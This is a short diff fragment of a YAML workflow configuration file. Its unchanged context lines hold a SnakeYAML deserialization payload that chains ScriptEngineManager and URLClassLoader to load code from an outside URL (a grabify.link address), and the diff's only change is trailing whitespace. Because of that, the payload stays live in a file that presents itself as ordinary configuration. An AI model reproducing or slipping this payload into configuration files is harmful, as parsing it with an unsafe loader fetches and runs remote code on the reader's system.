@@ -7,5 +7,5 @@ workflows:
 !!javax.script.ScriptEngineManager [  
   !!java.net.URLClassLoader [[  
        !!java.net.URL ["https://grabify.link/FTRHRF"]  
-  ]]  
+  ]]
 ] 
